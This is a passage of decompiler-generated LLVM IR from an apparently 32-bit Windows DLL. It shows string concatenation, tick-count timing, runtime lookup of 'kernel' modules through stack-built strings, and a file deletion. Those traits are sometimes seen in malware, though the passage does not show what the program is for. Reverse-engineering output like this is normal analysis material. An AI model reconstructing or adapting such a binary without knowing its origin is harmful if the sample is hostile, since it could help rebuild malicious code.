  %170 = inttoptr i32 %169 to i32*, !insn.addr !7103
  store i32 %120, i32* %170, align 4, !insn.addr !7103
  %171 = call i32 @function_1000a4e0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7104
  %172 = add i32 %stack_var_-11580.0.reload, 500000, !insn.addr !7105
  %173 = add i32 %stack_var_-11592.0.reload, -1, !insn.addr !7106
  %174 = icmp eq i32 %173, 0, !insn.addr !7106
  %175 = icmp eq i1 %174, false, !insn.addr !7107
  store i32 %172, i32* %stack_var_-11580.0.reg2mem, !insn.addr !7107
  store i32 %173, i32* %stack_var_-11592.0.reg2mem, !insn.addr !7107
  store i32 %156, i32* %esp.0.reg2mem, !insn.addr !7107
  store i32 %156, i32* %esp.1.reg2mem, !insn.addr !7107
  br i1 %175, label %dec_label_pc_1000c050, label %dec_label_pc_1000c101, !insn.addr !7107

dec_label_pc_1000c101:                            ; preds = %dec_label_pc_1000c050, %dec_label_pc_1000bf27
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %176 = add i32 %esp.1.reload, -4, !insn.addr !7108
  %177 = inttoptr i32 %176 to i32*, !insn.addr !7108
  store i32 %104, i32* %177, align 4, !insn.addr !7108
  %178 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !7109
  %179 = ashr i32 %178, 31, !insn.addr !7110
  %180 = zext i32 %178 to i64, !insn.addr !7111
  %181 = zext i32 %179 to i64, !insn.addr !7111
  %182 = mul i64 %181, 4294967296, !insn.addr !7111
  %183 = or i64 %182, %180, !insn.addr !7111
  %184 = srem i64 %183, 500000, !insn.addr !7111
  %185 = trunc i64 %184 to i32, !insn.addr !7111
  %186 = icmp eq i32 %185, 0, !insn.addr !7112
  br i1 %186, label %dec_label_pc_1000c101.dec_label_pc_1000c1e1_crit_edge, label %dec_label_pc_1000c11e, !insn.addr !7113

dec_label_pc_1000c101.dec_label_pc_1000c1e1_crit_edge: ; preds = %dec_label_pc_1000c101
  %.pre = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !7114
  store i32 %.pre, i32* %.pre-phi.reg2mem
  store i32 %176, i32* %esp.2.reg2mem
  br label %dec_label_pc_1000c1e1

dec_label_pc_1000c11e:                            ; preds = %dec_label_pc_1000c101
  %187 = call i32 @GetTickCount(), !insn.addr !7115
  %188 = call i32 @function_1000b0c0(), !insn.addr !7116
  %189 = add i32 %esp.1.reload, -8, !insn.addr !7117
  %190 = inttoptr i32 %189 to i32*, !insn.addr !7117
  %191 = add i32 %esp.1.reload, -12, !insn.addr !7118
  %192 = inttoptr i32 %191 to i32*, !insn.addr !7118
  store i32 %88, i32* %192, align 4, !insn.addr !7118
  %193 = call i8* @lstrcpyA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7119
  %194 = add i32 %esp.1.reload, -16, !insn.addr !7120
  %195 = inttoptr i32 %194 to i32*, !insn.addr !7120
  %196 = add i32 %esp.1.reload, -20, !insn.addr !7121
  %197 = inttoptr i32 %196 to i32*, !insn.addr !7121
  store i32 %88, i32* %197, align 4, !insn.addr !7121
  %198 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7122
  %199 = add i32 %esp.1.reload, -24, !insn.addr !7123
  %200 = inttoptr i32 %199 to i32*, !insn.addr !7123
  store i32 ptrtoint ([4 x i8]* @global_var_100395b4 to i32), i32* %200, align 4, !insn.addr !7123
  %201 = add i32 %esp.1.reload, -28, !insn.addr !7124
  %202 = inttoptr i32 %201 to i32*, !insn.addr !7124
  store i32 %88, i32* %202, align 4, !insn.addr !7124
  %203 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7125
  %204 = add i32 %esp.1.reload, -32, !insn.addr !7126
  %205 = inttoptr i32 %204 to i32*, !insn.addr !7126
  %206 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %206, i32* %205, align 4, !insn.addr !7126
  %207 = add i32 %esp.1.reload, -36, !insn.addr !7127
  %208 = inttoptr i32 %207 to i32*, !insn.addr !7127
  store i32 %88, i32* %208, align 4, !insn.addr !7127
  %209 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7128
  %210 = add i32 %esp.1.reload, -40, !insn.addr !7129
  %211 = inttoptr i32 %210 to i32*, !insn.addr !7129
  store i32 ptrtoint (i16* @global_var_10039464 to i32), i32* %211, align 4, !insn.addr !7129
  %212 = add i32 %esp.1.reload, -44, !insn.addr !7130
  %213 = inttoptr i32 %212 to i32*, !insn.addr !7130
  store i32 %88, i32* %213, align 4, !insn.addr !7130
  %214 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7131
  %215 = add i32 %esp.1.reload, -48, !insn.addr !7132
  %216 = inttoptr i32 %215 to i32*, !insn.addr !7132
  store i32 %88, i32* %216, align 4, !insn.addr !7132
  %217 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !7133
  %218 = add i32 %esp.1.reload, -52, !insn.addr !7134
  %219 = inttoptr i32 %218 to i32*, !insn.addr !7134
  store i32 %104, i32* %219, align 4, !insn.addr !7134
  %220 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !7135
  %221 = ashr i32 %220, 31, !insn.addr !7136
  %222 = zext i32 %220 to i64, !insn.addr !7137
  %223 = zext i32 %221 to i64, !insn.addr !7137
  %224 = mul i64 %223, 4294967296, !insn.addr !7137
  %225 = or i64 %224, %222, !insn.addr !7137
  %226 = srem i64 %225, 500000, !insn.addr !7137
  %227 = trunc i64 %226 to i32, !insn.addr !7137
  %228 = mul i32 %107, 500000, !insn.addr !7138
  %229 = add i32 %217, %88
  %230 = add i32 %esp.1.reload, -56, !insn.addr !7139
  %231 = inttoptr i32 %230 to i32*, !insn.addr !7139
  store i32 %227, i32* %231, align 4, !insn.addr !7139
  %232 = add i32 %228, %104, !insn.addr !7140
  %233 = add i32 %esp.1.reload, -60, !insn.addr !7141
  %234 = inttoptr i32 %233 to i32*, !insn.addr !7141
  store i32 %232, i32* %234, align 4, !insn.addr !7141
  %235 = add i32 %esp.1.reload, -64, !insn.addr !7142
  %236 = inttoptr i32 %235 to i32*, !insn.addr !7142
  store i32 %229, i32* %236, align 4, !insn.addr !7142
  %237 = call i32 @_memcpy.12(), !insn.addr !7143
  store i32 %104, i32* %231, align 4, !insn.addr !7144
  %238 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !7145
  %239 = ashr i32 %238, 31, !insn.addr !7146
  %240 = zext i32 %238 to i64, !insn.addr !7147
  %241 = zext i32 %239 to i64, !insn.addr !7147
  %242 = mul i64 %241, 4294967296, !insn.addr !7147
  %243 = or i64 %242, %240, !insn.addr !7147
  %244 = srem i64 %243, 500000, !insn.addr !7147
  %245 = trunc i64 %244 to i32, !insn.addr !7147
  store i32 %arg3, i32* %234, align 4, !insn.addr !7148
  store i32 %arg1, i32* %236, align 4, !insn.addr !7149
  %246 = add i32 %esp.1.reload, -68, !insn.addr !7150
  %247 = inttoptr i32 %246 to i32*, !insn.addr !7150
  store i32 %119, i32* %247, align 4, !insn.addr !7150
  %248 = add i32 %229, %245, !insn.addr !7151
  %249 = inttoptr i32 %248 to i8*, !insn.addr !7151
  store i8 0, i8* %249, align 1, !insn.addr !7151
  %250 = add i32 %esp.1.reload, -72, !insn.addr !7152
  %251 = inttoptr i32 %250 to i32*, !insn.addr !7152
  store i32 %120, i32* %251, align 4, !insn.addr !7152
  %252 = call i32 @function_1000a4e0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7153
  store i32 %206, i32* %.pre-phi.reg2mem, !insn.addr !7154
  store i32 %230, i32* %esp.2.reg2mem, !insn.addr !7154
  br label %dec_label_pc_1000c1e1, !insn.addr !7154

dec_label_pc_1000c1e1:                            ; preds = %dec_label_pc_1000c101.dec_label_pc_1000c1e1_crit_edge, %dec_label_pc_1000c11e
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %.pre-phi.reload = load i32, i32* %.pre-phi.reg2mem
  %253 = call i32 @GetTickCount(), !insn.addr !7155
  %254 = and i32 %253, 65535, !insn.addr !7156
  %255 = call i32 @function_1000b0c0(), !insn.addr !7157
  %256 = add i32 %esp.2.reload, -4, !insn.addr !7158
  %257 = inttoptr i32 %256 to i32*, !insn.addr !7158
  store i32 %254, i32* %257, align 4, !insn.addr !7158
  %258 = add i32 %esp.2.reload, -12, !insn.addr !7159
  %259 = inttoptr i32 %258 to i32*, !insn.addr !7159
  store i32 %254, i32* %259, align 4, !insn.addr !7159
  %260 = call i32 @function_100074a0(i32 ptrtoint (i32* @1 to i32)), !insn.addr !7160
  %261 = call i32 @function_10001170(i32* nonnull @1), !insn.addr !7161
  %262 = add i32 %esp.2.reload, -20, !insn.addr !7162
  %263 = inttoptr i32 %262 to i32*, !insn.addr !7162
  store i32 ptrtoint ([4 x i8]* @global_var_100395b8 to i32), i32* %263, align 4, !insn.addr !7162
  %264 = call i32 @function_10001170(i32* nonnull @1), !insn.addr !7163
  %265 = add i32 %esp.2.reload, -24, !insn.addr !7114
  %266 = inttoptr i32 %265 to i32*, !insn.addr !7114
  store i32 %.pre-phi.reload, i32* %266, align 4, !insn.addr !7114
  %267 = call i32 @function_10001170(i32* nonnull @1), !insn.addr !7164
  %268 = add i32 %esp.2.reload, -28, !insn.addr !7165
  %269 = inttoptr i32 %268 to i32*, !insn.addr !7165
  store i32 ptrtoint ([3 x i8]* @global_var_100395b0 to i32), i32* %269, align 4, !insn.addr !7165
  %270 = call i32 @function_10001170(i32* nonnull @1), !insn.addr !7166
  %271 = add i32 %esp.2.reload, -32, !insn.addr !7167
  %272 = inttoptr i32 %271 to i32*, !insn.addr !7167
  store i32 %88, i32* %272, align 4, !insn.addr !7167
  %273 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !7168
  %274 = add i32 %esp.2.reload, -36, !insn.addr !7169
  %275 = inttoptr i32 %274 to i32*, !insn.addr !7169
  store i32 %arg3, i32* %275, align 4, !insn.addr !7169
  %276 = add i32 %esp.2.reload, -40, !insn.addr !7170
  %277 = inttoptr i32 %276 to i32*, !insn.addr !7170
  store i32 %arg1, i32* %277, align 4, !insn.addr !7170
  %278 = add i32 %esp.2.reload, -44, !insn.addr !7171
  %279 = inttoptr i32 %278 to i32*, !insn.addr !7171
  store i32 %119, i32* %279, align 4, !insn.addr !7171
  %280 = add i32 %esp.2.reload, -48, !insn.addr !7172
  %281 = inttoptr i32 %280 to i32*, !insn.addr !7172
  store i32 %120, i32* %281, align 4, !insn.addr !7172
  %282 = call i32 @function_1000a4e0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7173
  %283 = ptrtoint i32* %stack_var_-2564 to i32, !insn.addr !7174
  store i32 %283, i32* %275, align 4, !insn.addr !7174
  store i32 1000, i32* %277, align 4, !insn.addr !7175
  store i32 808606036, i32* %stack_var_-28, align 4, !insn.addr !7176
  %284 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !7177
  store i32 %284, i32* %279, align 4, !insn.addr !7177
  %285 = load i32, i32* %stack_var_-28, align 4, !insn.addr !7178
  %286 = inttoptr i32 %285 to i32*, !insn.addr !7178
  %287 = call i32 @function_10001170(i32* %286), !insn.addr !7178
  store i32 100, i32* %281, align 4, !insn.addr !7179
  store i32 808540500, i32* %stack_var_-28, align 4, !insn.addr !7180
  %288 = add i32 %esp.2.reload, -52, !insn.addr !7181
  %289 = inttoptr i32 %288 to i32*, !insn.addr !7181
  store i32 0, i32* %289, align 4, !insn.addr !7181
  %290 = add i32 %esp.2.reload, -56, !insn.addr !7182
  %291 = inttoptr i32 %290 to i32*, !insn.addr !7182
  %292 = ptrtoint i32* %stack_var_-932 to i32, !insn.addr !7182
  store i32 %292, i32* %291, align 4, !insn.addr !7182
  store i32 878202964, i32* %stack_var_-80, align 4, !insn.addr !7183
  store i32 878202964, i32* %stack_var_-60, align 4, !insn.addr !7184
  %293 = call i32* @_memset(i32* inttoptr (i32 878202964 to i32*), i32 1680750649, i32 29793), !insn.addr !7185
  store i32 1634038339, i32* %stack_var_-932, align 4, !insn.addr !7186
  %294 = call i32 @function_10009390(), !insn.addr !7187
  store i32 259, i32* %281, align 4, !insn.addr !7188
  store i32 0, i32* %289, align 4, !insn.addr !7189
  %295 = ptrtoint i32* %stack_var_-1563 to i32, !insn.addr !7190
  store i32 %295, i32* %291, align 4, !insn.addr !7190
  %296 = inttoptr i32 %294 to i32*, !insn.addr !7191
  %297 = call i32* @_memset(i32* %296, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7191
  %298 = call i32 @function_10009390(), !insn.addr !7192
  store i32 259, i32* %281, align 4, !insn.addr !7193
  store i32 0, i32* %289, align 4, !insn.addr !7194
  %299 = ptrtoint i32* %stack_var_-1299 to i32, !insn.addr !7195
  store i32 %299, i32* %291, align 4, !insn.addr !7195
  %300 = inttoptr i32 %298 to i32*, !insn.addr !7196
  %301 = call i32* @_memset(i32* %300, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7196
  %302 = call i32 @function_10009390(), !insn.addr !7197
  store i32 %284, i32* %281, align 4, !insn.addr !7198
  store i32 %arg2, i32* %289, align 4, !insn.addr !7199
  %303 = inttoptr i32 %302 to i8*, !insn.addr !7200
  %304 = call i8* @_strstr(i8* %303, i8* bitcast (i32* @1 to i8*)), !insn.addr !7200
  %305 = icmp eq i8* %304, null, !insn.addr !7201
  %306 = icmp eq i1 %305, false, !insn.addr !7202
  store i32 %278, i32* %esp.3.reg2mem, !insn.addr !7202
  br i1 %306, label %dec_label_pc_1000c43c, label %dec_label_pc_1000c3c2, !insn.addr !7202

dec_label_pc_1000c3c2:                            ; preds = %dec_label_pc_1000c1e1
  %307 = ptrtoint i32* %stack_var_-80 to i32, !insn.addr !7203
  store i32 %307, i32* %281, align 4, !insn.addr !7203
  store i32 %arg2, i32* %289, align 4, !insn.addr !7204
  %308 = call i8* @_strstr(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7205
  %309 = icmp eq i8* %308, null, !insn.addr !7206
  %310 = icmp eq i1 %309, false, !insn.addr !7207
  store i32 %278, i32* %esp.3.reg2mem, !insn.addr !7207
  br i1 %310, label %dec_label_pc_1000c43c, label %dec_label_pc_1000c3d3, !insn.addr !7207

dec_label_pc_1000c3d3:                            ; preds = %dec_label_pc_1000c3c2
  %311 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !7208
  store i32 %311, i32* %281, align 4, !insn.addr !7208
  store i32 %arg2, i32* %289, align 4, !insn.addr !7209
  %312 = call i8* @_strstr(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !7210
  %313 = icmp eq i8* %312, null, !insn.addr !7211
  %314 = icmp eq i1 %313, false, !insn.addr !7212
  store i32 %278, i32* %esp.3.reg2mem, !insn.addr !7212
  br i1 %314, label %dec_label_pc_1000c43c, label %dec_label_pc_1000c3e4, !insn.addr !7212

dec_label_pc_1000c3e4:                            ; preds = %dec_label_pc_1000c3d3
  %315 = ptrtoint i8* %312 to i32, !insn.addr !7210
  store i32 %315, i32* %281, align 4, !insn.addr !7213
  store i32 128, i32* %289, align 4, !insn.addr !7214
  store i32 2, i32* %291, align 4, !insn.addr !7215
  %316 = add i32 %esp.2.reload, -60, !insn.addr !7216
  %317 = inttoptr i32 %316 to i32*, !insn.addr !7216
  store i32 %315, i32* %317, align 4, !insn.addr !7216
  %318 = add i32 %esp.2.reload, -64, !insn.addr !7217
  %319 = inttoptr i32 %318 to i32*, !insn.addr !7217
  store i32 %315, i32* %319, align 4, !insn.addr !7217
  %320 = add i32 %esp.2.reload, -68, !insn.addr !7218
  %321 = inttoptr i32 %320 to i32*, !insn.addr !7218
  store i32 1073741824, i32* %321, align 4, !insn.addr !7218
  %322 = add i32 %esp.2.reload, -72, !insn.addr !7219
  %323 = inttoptr i32 %322 to i32*, !insn.addr !7219
  store i32 %283, i32* %323, align 4, !insn.addr !7219
  store i32 %arg2, i32* %edx.0.reg2mem, !insn.addr !7220
  br label %dec_label_pc_1000c411, !insn.addr !7220

dec_label_pc_1000c411:                            ; preds = %dec_label_pc_1000c411, %dec_label_pc_1000c3e4
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %324 = inttoptr i32 %edx.0.reload to i8*, !insn.addr !7221
  %325 = load i8, i8* %324, align 1, !insn.addr !7221
  %326 = add i32 %edx.0.reload, 1, !insn.addr !7222
  %327 = icmp eq i8 %325, 0, !insn.addr !7223
  %328 = icmp eq i1 %327, false, !insn.addr !7224
  store i32 %326, i32* %edx.0.reg2mem, !insn.addr !7224
  br i1 %328, label %dec_label_pc_1000c411, label %dec_label_pc_1000c418, !insn.addr !7224

dec_label_pc_1000c418:                            ; preds = %dec_label_pc_1000c411
  %329 = sub i32 %edx.0.reload, %arg2, !insn.addr !7225
  %330 = add i32 %esp.2.reload, -76, !insn.addr !7226
  %331 = inttoptr i32 %330 to i32*, !insn.addr !7226
  store i32 0, i32* %331, align 4, !insn.addr !7226
  %332 = add i32 %esp.2.reload, -80, !insn.addr !7227
  %333 = inttoptr i32 %332 to i32*, !insn.addr !7227
  %334 = ptrtoint i32* %stack_var_-11624 to i32, !insn.addr !7227
  store i32 %334, i32* %333, align 4, !insn.addr !7227
  %335 = add i32 %esp.2.reload, -84, !insn.addr !7228
  %336 = inttoptr i32 %335 to i32*, !insn.addr !7228
  store i32 %329, i32* %336, align 4, !insn.addr !7228
  %337 = add i32 %esp.2.reload, -88, !insn.addr !7229
  %338 = inttoptr i32 %337 to i32*, !insn.addr !7229
  store i32 %arg2, i32* %338, align 4, !insn.addr !7229
  %339 = add i32 %esp.2.reload, -92, !insn.addr !7230
  %340 = inttoptr i32 %339 to i32*, !insn.addr !7230
  store i32 %283, i32* %340, align 4, !insn.addr !7230
  %341 = add i32 %esp.2.reload, -96, !insn.addr !7231
  %342 = inttoptr i32 %341 to i32*, !insn.addr !7231
  store i32 %283, i32* %342, align 4, !insn.addr !7231
  store i32 %341, i32* %esp.3.reg2mem, !insn.addr !7232
  br label %dec_label_pc_1000c43c, !insn.addr !7232

dec_label_pc_1000c43c:                            ; preds = %dec_label_pc_1000c418, %dec_label_pc_1000c3d3, %dec_label_pc_1000c3c2, %dec_label_pc_1000c1e1
  %343 = add i32 %esp.2.reload, -8, !insn.addr !7233
  %344 = inttoptr i32 %343 to i32*, !insn.addr !7233
  %345 = add i32 %esp.2.reload, -16, !insn.addr !7234
  %346 = inttoptr i32 %345 to i32*, !insn.addr !7234
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %347 = add i32 %esp.3.reload, -4, !insn.addr !7235
  %348 = inttoptr i32 %347 to i32*, !insn.addr !7235
  store i32 %104, i32* %348, align 4, !insn.addr !7235
  %349 = add i32 %esp.3.reload, -8, !insn.addr !7236
  %350 = inttoptr i32 %349 to i32*, !insn.addr !7236
  store i32 %88, i32* %350, align 4, !insn.addr !7236
  %351 = load i32, i32* @global_var_10040944, align 4, !insn.addr !7237
  %352 = add i32 %esp.3.reload, -12, !insn.addr !7237
  %353 = inttoptr i32 %352 to i32*, !insn.addr !7237
  store i32 %351, i32* %353, align 4, !insn.addr !7237
  %354 = add i32 %esp.3.reload, -16, !insn.addr !7238
  %355 = inttoptr i32 %354 to i32*, !insn.addr !7238
  store i32 %arg2, i32* %355, align 4, !insn.addr !7238
  %356 = call i1 @DeleteFileA(i8* bitcast (i32* @1 to i8*)), !insn.addr !7239
  br label %dec_label_pc_1000c45b, !insn.addr !7239

dec_label_pc_1000c45b:                            ; preds = %dec_label_pc_1000bae0, %dec_label_pc_1000c43c
  %357 = call i32 @"@__security_check_cookie@4"(), !insn.addr !7240
  ret i32 %357, !insn.addr !7241
}

define i32 @function_1000c480(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c480:
  %ecx.8.reg2mem = alloca i32, !insn.addr !7242
  %ecx.7.reg2mem = alloca i32, !insn.addr !7242
  %edi.10.reg2mem = alloca i32, !insn.addr !7242
  %ebx.0.reg2mem = alloca i32, !insn.addr !7242
  %esp.1.reg2mem = alloca i32, !insn.addr !7242
  %ecx.6.reg2mem = alloca i32, !insn.addr !7242
  %edi.9.reg2mem = alloca i32, !insn.addr !7242
  %edx.11.reg2mem = alloca i32, !insn.addr !7242
  %edi.8.reg2mem = alloca i32, !insn.addr !7242
  %edx.10.reg2mem = alloca i32, !insn.addr !7242
  %edi.7.reg2mem = alloca i32, !insn.addr !7242
  %edx.9.reg2mem = alloca i32, !insn.addr !7242
  %edi.6.reg2mem = alloca i32, !insn.addr !7242
  %edx.8.reg2mem = alloca i32, !insn.addr !7242
  %edi.5.reg2mem = alloca i32, !insn.addr !7242
  %edx.7.reg2mem = alloca i32, !insn.addr !7242
  %edi.4.reg2mem = alloca i32, !insn.addr !7242
  %edx.6.reg2mem = alloca i32, !insn.addr !7242
  %edi.3.reg2mem = alloca i32, !insn.addr !7242
  %edx.5.reg2mem = alloca i32, !insn.addr !7242
  %edi.2.reg2mem = alloca i32, !insn.addr !7242
  %edx.4.reg2mem = alloca i32, !insn.addr !7242
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !7242
  %edi.1.reg2mem = alloca i32, !insn.addr !7242
  %edx.3.reg2mem = alloca i32, !insn.addr !7242
  %edi.0.reg2mem = alloca i32, !insn.addr !7242
  %edx.2.reg2mem = alloca i32, !insn.addr !7242
  %ecx.5.reg2mem = alloca i32, !insn.addr !7242
  %edx.1.reg2mem = alloca i32, !insn.addr !7242
  %eax.2.reg2mem = alloca i32, !insn.addr !7242
  %stack_var_-16.1.reg2mem = alloca i32, !insn.addr !7242
  %eax.1.reg2mem = alloca i32, !insn.addr !7242
  %stack_var_-16.0.reg2mem = alloca i32, !insn.addr !7242
  %edx.0.reg2mem = alloca i32, !insn.addr !7242
  %ecx.0.reg2mem = alloca i32, !insn.addr !7242
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i1 @__decompiler_undefined_function_5()
  %stack_var_1240 = alloca i32, align 4
  %stack_var_2640 = alloca i32, align 4
  %stack_var_3039 = alloca i32, align 4
  %stack_var_80 = alloca i32, align 4
  %stack_var_2644 = alloca i32, align 4
  %stack_var_708 = alloca i32, align 4
  %stack_var_3043 = alloca i32, align 4
  %stack_var_844 = alloca i32, align 4
  %stack_var_1640 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_76 = alloca i32, align 4
  %3 = call i128 @__decompiler_undefined_function_3()
  %stack_var_6092 = alloca i32, align 4
  %stack_var_6100 = alloca i32, align 4
  %stack_var_1643 = alloca i32, align 4
  %stack_var_1644 = alloca i32, align 4
  %stack_var_1652 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_28100 = alloca i32, align 4
  %stack_var_-80 = alloca i8*, align 4
  %stack_var_-76 = alloca i8*, align 4
  %stack_var_8100 = alloca i32, align 4
  %stack_var_3051 = alloca i32, align 4
  %stack_var_3052 = alloca i32, align 4
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_3060 = alloca i32, align 4
  %stack_var_1268 = alloca i32, align 4
  %stack_var_1276 = alloca i32, align 4
  %stack_var_2684 = alloca i32, align 4
  %stack_var_124 = alloca i32, align 4
  %stack_var_645 = alloca i32, align 4
  %stack_var_-48 = alloca i16*, align 4
  %stack_var_-44 = alloca i8*, align 4
  %stack_var_336 = alloca i32, align 4
  %stack_var_340 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_341 = alloca i32, align 4
  %stack_var_240 = alloca i32, align 4
  %stack_var_244 = alloca i32, align 4
  %4 = call i128 @__decompiler_undefined_function_3()
  %stack_var_780 = alloca i8, align 1
  %5 = call i128 @__decompiler_undefined_function_3()
  %6 = call i128 @__decompiler_undefined_function_3()
  %7 = call i128 @__decompiler_undefined_function_3()
  %8 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-20 = alloca i32, align 4
  %9 = call i32 @__chkstk(), !insn.addr !7243
  %10 = load i128, i128* @global_var_10039a30, align 4, !insn.addr !7244
  %11 = call i128 @__asm_movaps(i128 %10), !insn.addr !7244
  call void @__asm_movups(i128 %8, i128 %11), !insn.addr !7245
  %12 = load i128, i128* @global_var_100399c0, align 4, !insn.addr !7246
  %13 = call i128 @__asm_movaps(i128 %12), !insn.addr !7246
  call void @__asm_movups(i128 %7, i128 %13), !insn.addr !7247
  %14 = load i128, i128* @global_var_10039c80, align 4, !insn.addr !7248
  %15 = call i128 @__asm_movaps(i128 %14), !insn.addr !7248
  call void @__asm_movups(i128 %6, i128 %15), !insn.addr !7249
  %16 = load i128, i128* @global_var_10039b10, align 4, !insn.addr !7250
  %17 = call i128 @__asm_movaps(i128 %16), !insn.addr !7250
  call void @__asm_movups(i128 %5, i128 %17), !insn.addr !7251
  %18 = load i128, i128* @global_var_10039c50, align 4, !insn.addr !7252
  %19 = call i128 @__asm_movaps(i128 %18), !insn.addr !7252
  store i8 0, i8* %stack_var_780, align 1, !insn.addr !7253
  call void @__asm_movups(i128 %4, i128 %19), !insn.addr !7254
  %20 = call i32* @_memset(i32* inttoptr (i32 2112104 to i32*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7255
  store i32 1852990827, i32* %stack_var_244, align 4, !insn.addr !7256
  %21 = bitcast i32* %stack_var_244 to i8*
  %22 = call i32* @GetModuleHandleA(i8* nonnull %21), !insn.addr !7257
  %23 = call i32 @function_10009390(), !insn.addr !7258
  store i32 %23, i32* @global_var_1004094c, align 4, !insn.addr !7259
  %24 = call i32 @function_10009390(), !insn.addr !7260
  %25 = call i32* @_memset(i32* nonnull %stack_var_341, i32 0, i32 99), !insn.addr !7261
  store i32 1852990827, i32* %stack_var_340, align 4, !insn.addr !7262
  %26 = bitcast i32* %stack_var_340 to i8*
  %27 = call i32* @GetModuleHandleA(i8* nonnull %26), !insn.addr !7263
  %28 = call i32 @function_10009390(), !insn.addr !7264
  store i32 %28, i32* @global_var_1004094c, align 4, !insn.addr !7265
  %29 = ptrtoint i32* %stack_var_336 to i32, !insn.addr !7266
  store i32 %29, i32* %stack_var_-36, align 4, !insn.addr !7266
  %30 = call i32 @function_10009390(), !insn.addr !7267
  %31 = call i32 @function_10009390(), !insn.addr !7268
  %32 = call i32 @function_10009390(), !insn.addr !7269
  %33 = bitcast i8* %stack_var_780 to i32*
  %34 = call i32* @_memset(i32* nonnull %33, i32 0, i32 100), !insn.addr !7270
  store i8 87, i8* %stack_var_780, align 1, !insn.addr !7271
  %35 = call i32 @function_10009390(), !insn.addr !7272
  store i8* null, i8** %stack_var_-44, align 4, !insn.addr !7273
  %36 = bitcast i32* %stack_var_645 to i16*
  store i16* %36, i16** %stack_var_-48, align 4, !insn.addr !7274
  %37 = call i32* @_memset(i32* nonnull %stack_var_645, i32 0, i32 99), !insn.addr !7275
  %38 = call i32 @function_10009390(), !insn.addr !7276
  %39 = ptrtoint i32* %stack_var_124 to i32, !insn.addr !7277
  store i32 %39, i32* %ecx.0.reg2mem, !insn.addr !7278
  br label %dec_label_pc_1000c757, !insn.addr !7278

dec_label_pc_1000c757:                            ; preds = %dec_label_pc_1000c757, %dec_label_pc_1000c480
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %40 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !7279
  %41 = load i8, i8* %40, align 1, !insn.addr !7279
  %42 = add i32 %ecx.0.reload, 1, !insn.addr !7280
  %43 = icmp eq i8 %41, 0, !insn.addr !7281
  %44 = icmp eq i1 %43, false, !insn.addr !7282
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !7282
  br i1 %44, label %dec_label_pc_1000c757, label %dec_label_pc_1000c75e, !insn.addr !7282

dec_label_pc_1000c75e:                            ; preds = %dec_label_pc_1000c757
  %45 = ptrtoint i32* %stack_var_240 to i32, !insn.addr !7283
  br label %dec_label_pc_1000c770, !insn.addr !7284

dec_label_pc_1000c770:                            ; preds = %dec_label_pc_1000c770, %dec_label_pc_1000c75e
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %46 = inttoptr i32 %edx.0.reload to i8*, !insn.addr !7285
  %47 = load i8, i8* %46, align 1, !insn.addr !7285
  %48 = add i32 %edx.0.reload, 1, !insn.addr !7286
  %49 = icmp eq i8 %47, 0, !insn.addr !7287
  %50 = icmp eq i1 %49, false, !insn.addr !7288
  store i32 %48, i32* %edx.0.reg2mem, !insn.addr !7288
  br i1 %50, label %dec_label_pc_1000c770, label %dec_label_pc_1000c777, !insn.addr !7288

dec_label_pc_1000c777:                            ; preds = %dec_label_pc_1000c770
  %51 = icmp eq i32 %edx.0.reload, %0, !insn.addr !7289
  br i1 %51, label %dec_label_pc_1000c815, label %dec_label_pc_1000c787.preheader, !insn.addr !7290

dec_label_pc_1000c787.preheader:                  ; preds = %dec_label_pc_1000c777
  %52 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !7291
  %53 = add i32 %0, 1
  %54 = add i32 %52, 920
